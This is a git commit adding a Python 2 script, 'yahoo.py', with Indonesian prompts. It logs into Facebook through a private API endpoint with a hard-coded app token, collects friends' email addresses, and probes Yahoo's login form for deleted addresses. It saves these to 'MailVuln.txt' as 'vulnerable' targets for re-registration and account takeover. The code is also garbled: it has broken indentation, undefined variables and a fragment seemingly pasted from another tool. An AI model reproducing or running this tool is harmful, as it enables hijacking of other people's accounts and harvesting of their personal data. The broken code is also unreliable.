53a8dc036ac94d988d980a7cfee03b73ec441e51
Fajar Septianto <49784833+F4JAR-ID@users.noreply.github.com>
2019-07-03 20:42:47 +0700

    Create yahoo.py

---
+++ yahoo.py
@@ -0,0 +1,136 @@
+# Author: Fajar Id
+import requests, json, os, re, sys, mechanize, urllib
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+os.system("clear")
+idt = raw_input("\033[39m[\033[31m*\033[39m] Masukkan Email   : ")
+passw = raw_input("\033[39m[\033[31m*\033[39m] Masukkan Password: ")
+url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
+data = urllib.urlopen(url)
+op = json.load(data)
+if 'access_token' in op:
+    token = (op["access_token"])
+    print ("\033[39m[\033[31m+\033[39m] Login Berhasil Sob")
+else:
+    print ("\033[39m[\033[31m+\033[39m] \033[31mLogin Gagal Cukk!")
+    sys.exit()
+get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
+hasil = json.loads(get_friends.text)
+print ("\033[39m[\033[31m+\033[39m] Berhasil Mendapatkan ID Teman...")
+#cok = open('Mail_Yahoo.txt','w')
+os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    mpsh = []
+    jml = 0
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+    kimak = json.loads(friends.text)
+    save = open('MailVuln.txt', 'w')
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    for w in kimak['data']:
+        jml += 1
+        mpsh.append(jml)
+        id = w['id']
+        nama = w['name']
+        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
+        z = json.loads(links.text)
+        try:
+            mail = z['email']
+            yahoo = re.compile('@.*')
+            otw = yahoo.search(mail).group()
+            if 'yahoo.com' in otw:
+                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+                br._factory.is_html = True
+                br.select_form(nr=0)
+                br['username'] = mail
+                klik = br.submit().read()
+                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
+                try:
+                    pek = jok.search(klik).group()
+                except:
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
+                    continue
+
+                if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                    save.write(mail + '\n')
+                    print 52 * '\x1b[1;97m\xe2\x95\x90'
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + nama
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
+                    print 52 * '\x1b[1;97m\xe2\x95\x90'
+                else:
+                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
+        except KeyError:
+            pass
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
+    print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m:\x1b[1;97m MailVuln.txt'
+    save.close()
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+    menu_yahoo()
+
+
+def yahoolist():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
+        try:
+            total = open(files, 'r')
+            mail = total.readlines()
+        except IOError:
+            print '\x1b[1;91m[!] File not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_yahoo()
+
+    mpsh = []
+    jml = 0
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+    save = open('MailVuln.txt', 'w')
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
+    print
+    mail = open(files, 'r').readlines()
+    for pw in mail:
+        mail = pw.replace('\n', '')
+        jml += 1
+        mpsh.append(jml)
+        yahoo = re.compile('@.*')
+        otw = yahoo.search(mail).group()
+        if 'yahoo.com' in otw:
+            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+            br._factory.is_html = True
+            br.select_form(nr=0)
+            br['username'] = mail
+            klik = br.submit().read()
+            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
+            try:
+                pek = jok.search(klik).group()
+            except:
+                print '\x1b[1;91m ' + mail
+                continue
+
+            if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                save.write(mail + '\n')
+                print '\x1b[1;92m ' + mail
+            else:
+                print '\x1b[1;91m ' + mail
+
+    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
+    print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m:\x1b[1;97m MailVuln.txt'
+    save.close()
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+    menu_yahoo()
+exit;
